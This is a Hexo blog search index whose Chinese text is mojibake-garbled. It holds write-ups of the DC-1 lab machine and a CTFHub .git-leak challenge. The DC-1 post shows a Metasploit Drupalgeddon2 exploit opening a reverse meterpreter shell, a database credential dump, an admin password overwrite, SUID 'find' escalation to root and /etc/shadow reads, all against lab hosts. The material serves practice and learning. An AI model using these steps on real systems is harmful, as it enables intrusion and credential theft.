<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>DCç³»åˆ—é¶æœº</title>
    <url>/2021/05/14/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/</url>
    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>

<h3 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h3><p>kaliï¼š192.168.126.128                                                é¶æœºï¼š192.168.126.135</p>
<p>å…ˆ<code>arp-scan -l</code>æ‰«ä¸€ä¸‹ipï¼Œå†ç”¨nmapæ‰«ç«¯å£<code>nmap -v -A 192.168.126.135</code>æˆ–<code>nmap -sV -p-192.168.126.135</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">//nmap -sV -p- 192.168.126.135</span><br><span class="line">â”Œâ”€â”€(rootğŸ’€hack)-[~]</span><br><span class="line">â””â”€# nmap -sV -p- 192.168.126.135</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-03 11:48 CST</span><br><span class="line">Nmap scan report for 192.168.126.135</span><br><span class="line">Host is up (0.0010s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.2.22 ((Debian))</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">34271/tcp open  status  1 (RPC #100024)</span><br><span class="line">MAC Address: 00:50:56:22:CC:DD (VMware)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 17.05 seconds</span><br></pre></td></tr></table></figure>

<p>å‘ç°å­˜åœ¨webæœåŠ¡ï¼Œç”¨whatwebæ‰«ä¸€ä¸‹<code>whatweb 192.168.126.135</code>æˆ–<code>whatweb -v 192.168.126.135</code>ï¼ˆæ›´è¯¦ç»†ï¼‰</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€hack)-[~]</span><br><span class="line">â””â”€# whatweb 192.168.126.135 </span><br><span class="line">http://192.168.126.135 [200 OK] Apache[2.2.22], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Debian Linux][Apache/2.2.22 (Debian)], IP[192.168.126.135], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], PHP[5.4.45-0+deb7u14], PasswordField[pass], Script[text/javascript], Title[Welcome to Drupal Site | Drupal Site], UncommonHeaders[x-generator], X-Powered-By[PHP/5.4.45-0+deb7u14]</span><br></pre></td></tr></table></figure>

<p>å‘ç°å¯¹åº”cmsä¸ºDrupal7ï¼Œç›´æ¥ä¸Šmsfï¼ˆmsfconsoleï¼‰æœç´¢drupalçš„å¯ç”¨æ´</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf6 &gt; search drupal</span><br><span class="line">                                                                                                                       Matching Modules                                                                                                       ================                                                                                                          #  Name                                           Disclosure Date  Rank       Check  Description                                                                                                                                          </span><br><span class="line">   -  ----                                           ---------------  ----       -----  -----------                        0  exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution                                                                                                          1  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection                                                                                                   </span><br><span class="line">   2  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection                                                                                                        </span><br><span class="line">   3  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection                                                                                                              </span><br><span class="line">   4  exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution                                                                                                       </span><br><span class="line">   5  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE                                                                                                          6  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration                                                                                                                7  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution                                                                                                                 </span><br><span class="line">                                                                                                                     </span><br><span class="line">Interact with a module by name or index. For example info 7, use 7 or use exploit/unix/webapp/php_xmlrpc_eval </span><br></pre></td></tr></table></figure>

<p>é€‰æ‹©æ—¶é—´æ¯”è¾ƒæ–°çš„åˆ©ç”¨ï¼Œè¿™é‡Œä½¿ç”¨18å¹´å¯¹åº”çš„é‚£ä¸ª </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use exploit/unix/webapp/drupal_drupalgeddon2 </span><br><span class="line">[*] No payload configured, defaulting to php/meterpreter/reverse_tcp                                                   msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; show options                                                           Module options (exploit/unix/webapp/drupal_drupalgeddon2):                                                                                                                                                                                   </span><br><span class="line">   Name         Current Setting  Required  Description                                                                                                                                                                                       </span><br><span class="line">   ----         ---------------  --------  -----------                                                                                                                                                                                       </span><br><span class="line">   DUMP_OUTPUT  false            no        Dump payload command output                                                                                                                                                                       </span><br><span class="line">   PHP_FUNC     passthru         yes       PHP function to execute                                                                                                                                                                           </span><br><span class="line">   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT        80               yes       The target port (TCP)</span><br><span class="line">   SSL          false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   TARGETURI    /                yes       Path to Drupal install</span><br><span class="line">   VHOST                         no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.126.128  yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic (PHP In-Memory)</span><br><span class="line"></span><br><span class="line">msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rhost 192.168.126.135</span><br><span class="line">rhost =&gt; 192.168.126.135</span><br><span class="line">msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.126.128:4444 </span><br><span class="line">[*] Executing automatic check (disable AutoCheck to override)</span><br><span class="line">[!] The service is running, but could not be validated.</span><br><span class="line">[*] Sending stage (39282 bytes) to 192.168.126.135</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.126.128:4444 -&gt; 192.168.126.135:40437) at 2021-08-03 11:58:47 +0800</span><br></pre></td></tr></table></figure>

<p><code>rhostå¯¹åº”çš„æ˜¯é¶æœºip</code></p>
<p>æ¥ä¸‹æ¥å‡ºç°<code>meterpreter &gt; </code>è¯´æ˜æˆåŠŸæ‰§è¡Œäº†exploit</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#å¼¹å‡ºäº¤äº’å¼teriminal</span><br><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3485 created.</span><br><span class="line">Channel 0 created.</span><br><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">www-data@DC-1:/var/www$ </span><br></pre></td></tr></table></figure>

<p>å…ˆæŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ ls</span><br><span class="line">ls</span><br><span class="line">LICENSE.txt      flag1.txt    profiles    web.config</span><br><span class="line">COPYRIGHT.txt       MAINTAINERS.txt  includes     robots.txt  xmlrpc.php</span><br><span class="line">INSTALL.mysql.txt   README.txt       index.php    scripts</span><br><span class="line">INSTALL.pgsql.txt   UPGRADE.txt      install.php  sites</span><br><span class="line">INSTALL.sqlite.txt  authorize.php    misc         themes</span><br><span class="line">INSTALL.txt         cron.php         modules      update.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å‘ç°äº†flag1.txtï¼Œcatä¸€ä¸‹</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">w-data@DC-1:/var/www$ cat flag1.txt</span><br><span class="line">cat flag1.txt</span><br><span class="line">Every good CMS needs a config file - and so do you.</span><br><span class="line">//å¤§æ¦‚æ„æ€å°±æ˜¯è¦æ‰¾åˆ°å¯¹åº”çš„configæ–‡ä»¶</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨findå‘½ä»¤æ‰¾ä¸€ä¸‹settings.php</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ find -name &#x27;settings.php&#x27;</span><br><span class="line">find -name &#x27;settings.php&#x27;</span><br><span class="line">./sites/default/settings.php</span><br><span class="line">www-data@DC-1:/var/www$ cat ./sites/default/settings.php</span><br><span class="line">cat ./sites/default/settings.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> *</span><br><span class="line"> * flag2</span><br><span class="line"> * Brute force and dictionary attacks aren&#x27;t the</span><br><span class="line"> * only ways to gain access (and you WILL need access).</span><br><span class="line"> * What can you do with these credentials?</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">databases = array (</span></span><br><span class="line">  &#x27;default&#x27; =&gt; </span><br><span class="line">  array (</span><br><span class="line">    &#x27;default&#x27; =&gt; </span><br><span class="line">    array (</span><br><span class="line">      &#x27;database&#x27; =&gt; &#x27;drupaldb&#x27;,</span><br><span class="line">      &#x27;username&#x27; =&gt; &#x27;dbuser&#x27;,</span><br><span class="line">      &#x27;password&#x27; =&gt; &#x27;R0ck3t&#x27;,</span><br><span class="line">      &#x27;host&#x27; =&gt; &#x27;localhost&#x27;,</span><br><span class="line">      &#x27;port&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">      &#x27;driver&#x27; =&gt; &#x27;mysql&#x27;,</span><br><span class="line">      &#x27;prefix&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br><span class="line">â€¦â€¦</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™é‡Œå‘ç°äº†flag2ï¼Œå¤§æ¦‚æ„æ€æ˜¯<strong>æš´åŠ›å’Œå­—å…¸æ”»å‡»å¹¶ä¸æ˜¯è·å¾—è®¿é—®æƒé™çš„å”¯ä¸€æ–¹æ³•ï¼ˆè€Œä¸”ä½ éœ€è¦è®¿é—®æƒé™ï¼‰ï¼Œä½ å°†å¦‚ä½•å¤„ç†è¿™äº›æ•°æ®ï¼Ÿ</strong>åœ¨æ–‡ä»¶ä¸­è¿˜çœ‹åˆ°äº†æ•°æ®åº“çš„ç›¸å…³ä¿¡æ¯å¹¶ä¸”ç»™å‡ºäº†ä¸€ä¸ªä½æƒé™çš„è´¦å·ï¼Œå…ˆæŸ¥çœ‹ä¸€ä¸‹æ•°æ®åº“ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| drupaldb           |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; use drupaldb</span><br><span class="line">use drupaldb</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">show tables;</span><br><span class="line">+-----------------------------+</span><br><span class="line">| Tables_in_drupaldb          |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| ......                      |</span><br><span class="line">| users                       |</span><br><span class="line">| ......                      |</span><br><span class="line">+-----------------------------+</span><br><span class="line">80 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users;</span><br><span class="line">select * from users;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>uid</th>
<th>name</th>
<th>pass</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>admin</td>
<td>$S$DxQCTfic1drhqY7jbCf62drw/T204r3is./KmIUKEzlQUpfHx1RQ</td>
</tr>
<tr>
<td>2</td>
<td>Fred</td>
<td>$S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg</td>
</tr>
</tbody></table>
<p>usersè¡¨ä¸­æœ‰ä¸¤ä¸ªè´¦æˆ·ï¼Œä½†æ˜¯å¯†ç ç»è¿‡åŠ å¯†æ— æ³•æŸ¥çœ‹ï¼Œå¯ä»¥ç»“åˆdrupalçš„æœºå¯†æ–‡ä»¶æ¥ä¿®æ”¹å¯†ç ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ cd scripts</span><br><span class="line">cd scripts</span><br><span class="line">www-data@DC-1:/var/www/scripts$ cp -r ../includes ./</span><br><span class="line">cp -r ../includes ./</span><br><span class="line">www-data@DC-1:/var/www/scripts$ ls</span><br><span class="line">ls</span><br><span class="line">code-clean.sh  drupal.sh            generate-d6-content.sh  password-hash.sh</span><br><span class="line">cron-curl.sh   dump-database-d6.sh  generate-d7-content.sh  run-tests.sh</span><br><span class="line">cron-lynx.sh   dump-database-d7.sh  includes                test.script</span><br><span class="line">www-data@DC-1:/var/www/scripts$ ./password-hash.sh t0mr</span><br><span class="line">./password-hash.sh t0mr</span><br><span class="line"></span><br><span class="line">password: t0mr          hash: $S$DXk.TovSUw5QaQCopN17mumoRyldcf.UDXd40tEI5QluWgHqMQmA</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥å»æ•°æ®åº“ä¸­æ›´æ–°å¯†ç </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; update users set pass &#x3D; &#39;$S$DXk.TovSUw5QaQCopN17mumoRyldcf.UDXd40tEI5QluWgHqMQmA&#39; where name &#x3D; &#39;admin&#39;;</span><br><span class="line">&lt;17mumoRyldcf.UDXd40tEI5QluWgHqMQmA&#39; where name &#x3D; &#39;admin&#39;;                   </span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br></pre></td></tr></table></figure>

<p>è¿™æ—¶å€™å°±å¯ä»¥å›å»ç™»é™†äº†</p>
<p>åœ¨dashboardçœ‹åˆ°äº†flag3ï¼Œå†…å®¹æ˜¯ï¼š**Special PERMS will help FIND the passwd - but youâ€™ll need to -exec that command to work out how to get whatâ€™s in the shadow.**å¤§æ¦‚æ„æ€æ˜¯å‘Šè¯‰æˆ‘éœ€è¦æ€ä¹ˆæ‰¾åˆ°å¯†ç ï¼Œä½†æ˜¯éœ€è¦execå’Œshadowã€‚</p>
<p>ç‚¹å‡»flag3åï¼Œå…³æ³¨ç‚¹æ”¾åˆ°passwdæ–‡ä»¶å’Œshadowæ–‡ä»¶ã€‚Linuxä¸ºäº†è€ƒè™‘å®‰å…¨æ€§ï¼Œç”¨å•ç‹¬çš„shadowæ–‡ä»¶å­˜å‚¨Linuxç”¨æˆ·çš„å¯†ç ä¿¡æ¯ï¼Œå¹¶ä¸”åªæœ‰rootç”¨æˆ·æœ‰æƒé™è¯»å–æ­¤æ–‡ä»¶ã€‚æ‰€ä»¥ä¸‹ä¸€æ­¥ï¼Œæˆ‘ä»¬è¦è€ƒè™‘çš„æ˜¯ææƒäº†ã€‚<br>é‡‡ç”¨findææƒã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www-data@DC-1:/var/www/scripts$ touch 123</span><br><span class="line">touch 123</span><br><span class="line">www-data@DC-1:/var/www/scripts$ find / -name 123 -exec &quot;whoami&quot; \;</span><br><span class="line">find / -name 123 -exec &quot;whoami&quot; \;</span><br><span class="line">root</span><br><span class="line">www-data@DC-1:/var/www$ find / -name 123 -exec &quot;/bin/sh&quot; \;</span><br><span class="line">find / -name 123 -exec &quot;/bin/sh&quot; \;</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> /root</span></span><br><span class="line">cd /root</span><br><span class="line"><span class="meta">#</span><span class="bash"> </span></span><br></pre></td></tr></table></figure>

<p>ææƒæˆåŠŸåï¼ŒæŸ¥çœ‹shadowæ–‡ä»¶ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> cat /etc/shadow</span></span><br><span class="line">cat /etc/shadow</span><br><span class="line">root:$6$rhe3rFqk$NwHzwJ4H7abOFOM67.Avwl3j8c05rDVPqTIvWg8k3yWe99pivz/96.K7IqPlbBCmzpokVmn13ZhVyQGrQ4phd/:17955:0:99999:7:::</span><br><span class="line">daemon:*:17946:0:99999:7:::</span><br><span class="line">bin:*:17946:0:99999:7:::</span><br><span class="line">sys:*:17946:0:99999:7:::</span><br><span class="line">sync:*:17946:0:99999:7:::</span><br><span class="line">games:*:17946:0:99999:7:::</span><br><span class="line">man:*:17946:0:99999:7:::</span><br><span class="line">lp:*:17946:0:99999:7:::</span><br><span class="line">mail:*:17946:0:99999:7:::</span><br><span class="line">news:*:17946:0:99999:7:::</span><br><span class="line">uucp:*:17946:0:99999:7:::</span><br><span class="line">proxy:*:17946:0:99999:7:::</span><br><span class="line">www-data:*:17946:0:99999:7:::</span><br><span class="line">backup:*:17946:0:99999:7:::</span><br><span class="line">list:*:17946:0:99999:7:::</span><br><span class="line">irc:*:17946:0:99999:7:::</span><br><span class="line">gnats:*:17946:0:99999:7:::</span><br><span class="line">nobody:*:17946:0:99999:7:::</span><br><span class="line">libuuid:!:17946:0:99999:7:::</span><br><span class="line">Debian-exim:!:17946:0:99999:7:::</span><br><span class="line">statd:*:17946:0:99999:7:::</span><br><span class="line">messagebus:*:17946:0:99999:7:::</span><br><span class="line">sshd:*:17946:0:99999:7:::</span><br><span class="line">mysql:!:17946:0:99999:7:::</span><br><span class="line">flag4:$6$Nk47pS8q$vTXHYXBFqOoZERNGFThbnZfi5LN0ucGZe05VMtMuIFyqYzY/eVbPNMZ7lpfRVc0BYrQ0brAhJoEzoEWCKxVW80:17946:0:99999:7:::</span><br><span class="line"><span class="meta">#</span><span class="bash"> </span></span><br></pre></td></tr></table></figure>

<p>æ¥ç€çœ‹ä¸€ä¸‹å¯†ç æ–‡ä»¶</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> cat /etc/passwd</span></span><br><span class="line">cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">Debian-exim:x:101:104::/var/spool/exim4:/bin/false</span><br><span class="line">statd:x:102:65534::/var/lib/nfs:/bin/false</span><br><span class="line">messagebus:x:103:107::/var/run/dbus:/bin/false</span><br><span class="line">sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å…ˆå»homeä¸‹æŸ¥çœ‹ä¸€ä¸‹flag4</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> /home/flag4</span></span><br><span class="line">cd /home/flag4</span><br><span class="line"><span class="meta">#</span><span class="bash"> ls</span></span><br><span class="line">ls</span><br><span class="line">flag4.txt</span><br><span class="line"><span class="meta">#</span><span class="bash"> cat flag4.txt</span></span><br><span class="line">cat flag4.txt</span><br><span class="line">Can you use this same method to find or access the flag in root?</span><br><span class="line"></span><br><span class="line">Probably. But perhaps it&#x27;s not that easy.  Or maybe it is?</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æé†’è¦ç”¨rootæŸ¥çœ‹ã€‚</p>
<p>åœ¨shadowä¸­å‘ç°flag4æ˜¯ä¸€ä¸ªè´¦æˆ·ã€‚å¯èƒ½æ˜¯sshè´¦æˆ·ï¼Œä¸çŸ¥é“å’‹ç ´è§£ã€‚ã€‚çœ‹äº†å¤§ä½¬çš„æ–‡ç« åçŸ¥é“å¯†ç æ˜¯orangeã€‚ã€‚ã€‚emmå…¶å®æ²¡å•¥ç”¨ï¼Œflag4.txtåœ¨rootæ–‡ä»¶å¤¹ä¸‹</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> /root</span></span><br><span class="line">cd /root</span><br><span class="line"><span class="meta">#</span><span class="bash"> ls</span></span><br><span class="line">ls</span><br><span class="line">thefinalflag.txt</span><br><span class="line"><span class="meta">#</span><span class="bash"> cat the?????????.???</span> </span><br><span class="line">cat the?????????.???</span><br><span class="line">Well done!!!!</span><br><span class="line"></span><br><span class="line">Hopefully you&#x27;ve enjoyed this and learned some new skills.</span><br><span class="line"></span><br><span class="line">You can let me know what you thought of this little journey</span><br><span class="line">by contacting me via Twitter - @DCAU7</span><br></pre></td></tr></table></figure>

<p>DC-1è‡³æ­¤å°±ç»“æŸäº†<br>$$</p>
<p>$$</p>
]]></content>
      <categories>
        <category>å†…ç½‘é¶æœºç»ƒä¹ </category>
      </categories>
  </entry>
  <entry>
    <title>ctfhub æŠ€èƒ½æ ‘ .gitæ³„éœ²</title>
    <url>/2021/05/15/ctfhub_.git/</url>
    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>

<h2 id="Log"><a href="#Log" class="headerlink" title="Log"></a>Log</h2><p>ç›´æ¥è®¿é—®url/.git ä¸è¡Œ</p>
<p>åœ¨kalié‡Œå‘½ä»¤è¡Œè¿è¡ŒğŸ‘‡è¿›è¡Œæ–‡ä»¶æ¢å¤</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python2 GitHack.py url/.git</span><br></pre></td></tr></table></figure>

<p>è¿›å…¥distç›®å½•ä¸­åˆšåˆšæ¢å¤çš„æ–‡ä»¶å¤¹å†…ï¼Œè¯»å–gitæ—¥å¿—ğŸ‘‡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git log</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°ğŸ‘‡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">commit 13321dfebe7b705300f9d808b2eedb839a49be24 (HEAD -&gt; master)</span><br><span class="line">Author: CTFHub &lt;sandbox@ctfhub.com&gt;</span><br><span class="line">Date:   Sat May 15 13:46:29 2021 +0000</span><br><span class="line"></span><br><span class="line">    remove flag</span><br><span class="line"></span><br><span class="line">commit 10ec2f5284a6f063ba9575f16115289c952b9720</span><br><span class="line">Author: CTFHub &lt;sandbox@ctfhub.com&gt;</span><br><span class="line">Date:   Sat May 15 13:46:29 2021 +0000</span><br><span class="line"></span><br><span class="line">    add flag</span><br><span class="line"></span><br><span class="line">commit 59443cdfbb4da7e591fb939e829255a5d6afd238</span><br><span class="line">Author: CTFHub &lt;sandbox@ctfhub.com&gt;</span><br><span class="line">Date:   Sat May 15 13:46:29 2021 +0000</span><br><span class="line"></span><br><span class="line">    init</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥æ¢å¤åˆ°<code>addÂ flag</code>å¯¹åº”çš„ç‰ˆæœ¬å³å¯ğŸ‘‡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git reset --hard 10ec2f5284a6f063ba9575f16115289c952b9720</span><br></pre></td></tr></table></figure>

<p>åœ¨æ–‡ä»¶å¤¹ä¸­å³å¯å‘ç°å«æœ‰flagçš„txtæ–‡ä»¶</p>
<h2 id="Stash"><a href="#Stash" class="headerlink" title="Stash"></a>Stash</h2><p><a href="https://www.cnblogs.com/tocy/p/git-stash-reference.html">å‚è€ƒæ–‡ç« </a></p>
<p>æŒ‰ç…§Logä¸­çš„æ“ä½œï¼Œå›åˆ°<code>addÂ flag</code>çš„ç‰ˆæœ¬ï¼Œå‘ç°å¹¶æ²¡æœ‰flag</p>
<p>ç»“åˆè¿™å…³è€ƒå¯Ÿçš„çŸ¥è¯†ï¼Œä½¿ç”¨<code>gitÂ stashÂ list</code>å‘ç°æœ‰<code>addÂ flag</code>ğŸ‘‡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git stash list                                           </span><br><span class="line">stash@&#123;0&#125;: WIP on master: f16bcee add flag</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨<code>git stash apply</code> æˆ–è€…<code>gitÂ stashÂ pop</code>å‘½ä»¤ï¼Œå¯ä»¥å‘ç°ç›®å½•ä¸‹é‚£ä¸ªtxtæ–‡ä»¶è¢«ä¿®æ”¹äº†ï¼Œæ‰“å¼€å°±æ˜¯flag</p>
<h2 id="index"><a href="#index" class="headerlink" title="index"></a>index</h2><p>é‡å¤ä¸Šè¿°æ­¥éª¤ï¼Œåˆ°ç”¨git logæŸ¥çœ‹å†å²è®°å½•</p>
<p>ç›´æ¥æ¢å¤åˆ°<code>addÂ flag</code>çš„ç‰ˆæœ¬å³å¯å‘ç°flag</p>
<p>ä½†æ˜¯ï¼Œè¿™æ˜¾ç„¶ä¸æ˜¯æƒ³è¦è€ƒå¯Ÿçš„çŸ¥è¯†ç‚¹ã€‚</p>
<p>å›æº¯åˆ°git logæŸ¥çœ‹å†å²è®°å½•éƒ¨åˆ†</p>
<p>ä½¿ç”¨ğŸ‘‡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git diff 07b1d09050b04694f6a9b7f86b52b767041a9a84ï¼ˆè¿™ä¸€ä¸²æ˜¯add flag å¯¹åº”çš„é‚£ä¸²</span><br></pre></td></tr></table></figure>

<p>å³å¯çœ‹åˆ°flag</p>
<p>æˆ–è€…ä½¿ç”¨<code>gitÂ checkout</code>å‘½ä»¤æŸ¥è¯¢è¾“å‡ºæ–‡ä»¶ğŸ‘‡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git checkout</span><br><span class="line"></span><br><span class="line">git checkout -b 200544546585.txt</span><br></pre></td></tr></table></figure>

<p>å‘ç°æ–‡ä»¶å¤¹ä¸‹å‡ºç°ä¸€ä¸ªtxtæ–‡ä»¶ï¼Œåœ¨txtæ–‡ä»¶ä¸­å¯çœ‹åˆ°flag</p>
<p>å‘½ä»¤è§£é‡Š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">åˆ›å»ºæ–°åˆ†æ”¯ï¼šgit branch name</span><br><span class="line">åˆ‡æ¢åˆ°æ–°åˆ†æ”¯ï¼šgit checkout name</span><br><span class="line">ä¹Ÿå¯ä»¥åˆæˆä¸ºä¸€ä¸ªå‘½ä»¤ï¼š</span><br><span class="line">git checkout -b name</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>webå­¦ä¹ </category>
      </categories>
  </entry>
  <entry>
    <title>csictf2020 panda wp</title>
    <url>/2021/05/14/csictf-misc-panda/</url>
    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>



<p>é™„ä»¶ä¸ºzipå‹ç¼©åŒ… <a href="https://pan.baidu.com/s/1zkkhvzW4ORqCRsB-c7myGA">T0MR</a>ï¼ˆé™„ä»¶ä¸‹è½½</p>
